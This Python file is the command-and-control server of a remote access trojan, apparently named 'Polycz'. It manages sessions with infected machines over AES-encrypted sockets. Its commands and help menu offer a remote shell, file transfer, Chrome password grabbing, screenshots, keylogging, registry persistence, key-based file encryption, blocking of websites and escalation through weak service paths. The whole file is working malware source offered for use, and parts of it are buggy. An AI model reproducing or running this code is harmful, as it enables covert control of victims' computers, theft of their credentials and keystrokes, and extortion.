import socket
import termcolor
import json
import os
from Crypto.Util.Padding import pad ,unpad
from vidstream import StreamingServer
from config import *
from Crypto.Cipher import AES
import base64
import threading
global key

key = generate()
print("""



██████╗░░█████╗░██╗░░░░░██╗░░░██╗░█████╗░██████╗░
██╔══██╗██╔══██╗██║░░░░░╚██╗░██╔╝██╔══██╗╚════██╗
██████╔╝██║░░██║██║░░░░░░╚████╔╝░██║░░╚═╝░░███╔═╝
██╔═══╝░██║░░██║██║░░░░░░░╚██╔╝░░██║░░██╗██╔══╝░░
██║░░░░░╚█████╔╝███████╗░░░██║░░░╚█████╔╝███████╗

-made by polyester""")

def main():
    os.system("cls")
    print(welcome)
    print(termcolor.colored('[+] Waiting For The Incoming Connections ...', 'green'))
    while True:
        command = input('[😊] Command & Control Center: ')
        if command == 'list_sessions':
            counter = 0
            if ips == []:
                print("no session")
            else:
                for ip in ips:
                    print('Session ' + str(counter) + ' --- ' + str(ip).split(",")[0].replace("(", ""))
                    counter += 1
        elif command == "list":
            if ips == []:
                print("no ip connected")
            else:
                print(ips)
        elif command == 'clear':
            os.system('cls')
        elif command == "powershell":
            pass
        elif command[:7] == 'session':
            try:
                num = int(command[8:])
                tarnum = targets[num]
                tarip = ips[num]
                target_communication(target=tarnum, ip=tarip)
            except Exception as e:
                print("No such session ID")
                print(e)
        elif command == 'exit' or command == "exit":
            for target in targets:
                reliable_send(target, 'quit')
                target.close()
            sock.close()
            exit()
        elif command[:4] == 'kill':
            targ = targets[int(command[5:])]
            ip = ips[int(command[5:])]
            reliable_send(targ, 'quit')
            targ.close()
            targets.remove(targ)
            ips.remove(ip)
            print("session killed")
        elif command[:7] == 'sendall':
            x = len(targets)
            print(x)
            i = 0
            try:
                while i < x:
                    tarnumber = targets[i]
                    print(tarnumber)
                    reliable_send(tarnumber, command)
                    i += 1
            except:
                print('Failed')
        elif command == "help":
            print("""
list                ---> list the ip connected
session             ---> connect to a session
kill                ---> kill a session
sendall             ---> send the command to all ips
list_sessions       ---> list sessions
exit                ---> quit the C2 server
""")
        elif command == "":
            pass
        else:
            print(termcolor.colored('[!!] Command Doesnt Exist', 'red'))

def reliable_send(target, data):
    data = base64.b64encode(encryptcon(data.encode("utf-8"))).decode("utf-8")
    sjson = json.dumps(data)
    target.send(sjson.encode())

def encryptcon(message):
    aes = AES.new(skey, AES.MODE_CBC, siv)
    padded = pad(message, AES.block_size)
    return aes.encrypt(padded)

def decryptcon(message):
    aes = AES.new(skey, AES.MODE_CBC, siv)
    decrypt = aes.decrypt(message)
    unpadded = unpad(decrypt, AES.block_size)
    return(unpadded)

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(8096).decode().rstrip()
            return (decryptcon(base64.b64decode(json.loads(data)))).decode('utf-8')
        except ValueError:
            continue

def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(8096)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(8096)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def start_stream(target, server):
    try:
        server.start_server()
        print("server started, waiting for connection.....")
        result = reliable_recv(target)
        print(result)
    except:
        reliable_send(target, "client streaming stopped")


def target_communication(target, ip):
    print(connection)
    print("\n\n you have connected!! have fun😉\n\n\n")
    count = 0
    while True:
        command = input('[😈]Shell~%s: ' % str(ip))
        reliable_send(target, command)
        if command == 'quit':
            print("exiting everything including C2")
            exit()
        elif command == 'clear' or command == "cls":
            os.system('cls')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command [:10] == "chromegrab":
            print("downloading passwords")
            try:
                download_file("log.txt")
                print("saved as log.txt")
            except:
                print("failed to get chrome password")
        elif command[:10] == 'screenshot':
            f = open('screenshot%d.png' % (count), 'wb')
            target.settimeout(5)
            chunk = target.recv(8096)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(8096)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            print("screenshot saved as screenshot%d.png" % count)
            count += 1
            continue
        elif command == "keylog_stop":
            print("keylog has been stopped")
        elif command == 'encrypt':
            print("the fernet key is {}".format(key.decode('utf-8')))
            reliable_send(target, key.decode('utf-8'))
            filedirectory = input("Enter file path: ")
            if filedirectory == "exit":
                print("exiting...")
                target_communication()
            else:
                reliable_send(target, filedirectory)
                result = reliable_recv(target)
                print(result)
        elif command == "decrypt":
            print(("the fernet key is {}".format(key.decode('utf-8'))))
            reliable_send(target, key.decode('utf-8'))
            filedirectory = input("Enter encrypted file path: ")
            if filedirectory == "exit":
                print("exiting...")
                target_communication()
            else:
                reliable_send(target, filedirectory)
                result = reliable_recv(target)
                print(result)
        elif command == "getinfo":
            result = reliable_recv(target)
            print(result)
        elif command == "weakservice":
            print("scanning......")
            result = reliable_recv(target)
            print(result)
            if "No vulnerable service path detected" in result:
                pass
            else:
                print("the following vulnerable services binPath have been changed to C:\Temps\Program.exe")
        elif command == "start_stream":
            server = StreamingServer(lhost , sport)
            start_stream(target, server)
        elif command == "background":
            print(delconnection)
            input("\n\n backgrounded the connection \n\n\n press enter to return back to C2......")
            os.system("cls")
            main()
        elif command == 'help':
            print(termcolor.colored('''
                    :GENERAL COMMANDS:
        quit                                --> Quit Session With The Target
        clear                               --> Clear The Screen
        cd <Directory Name>                 --> Changes Directory On Target System
        upload <file name>                  --> Upload File To The target Machine
        download <file name>                --> Download File From Target Machine
        quit                                --> terminate the connection between the listener and the client
        background                          --> background the connection
        clip_copy                           --> copies clipboard content
        display <url>                       --> display an url image
        start_stream                        --> start streaming


                     :KEYLOGGER:
        keylog_start                        --> Start The Keylogger
        keylog_dump                         --> Print Keystrokes That The Target Inputted
        keylog_stop                         --> Stop And Self Destruct Keylogger File

                    :PERSISTENCE:
        persistence <RegName> <fileName>    --> Create Persistence In Registry


                    :Enumeration:
        getinfo                             --> gets system information
        checkpriv                           --> check admin privilege
        chromegrab                          --> grab chrome passwords
        screenshot                          --> get target screenshot

                    :Encryption:
        encrypt                            --> encrypt a single file
        decrypt                            --> decrypt a single file

                    :Internet control:
        blocksite                          --> blocks all website
        unblocksite                        --> unblock all website

                    :PRIVILEGE ESCALATION:
        weakservice                        --> checks for weak service path vulnerability and changes the binPath
        check_elevated                     --> checks for Always install elevated Vulnerability

                       :FUN:
        checkporn                           --> check the PC for visited porn websites using dns

        
        ''', 'green'))
        else:
            result = reliable_recv(target)
            print(result)

def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(termcolor.colored(str(ip).split(",")[0].replace("(", "") + ' has connected!', 'green'))
        except:
            pass

input("\n\npress enter to continue....")
targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((lhost, lport))
sock.listen(5)
t1 = threading.Thread(target=accept_connections)
t1.start()
main()
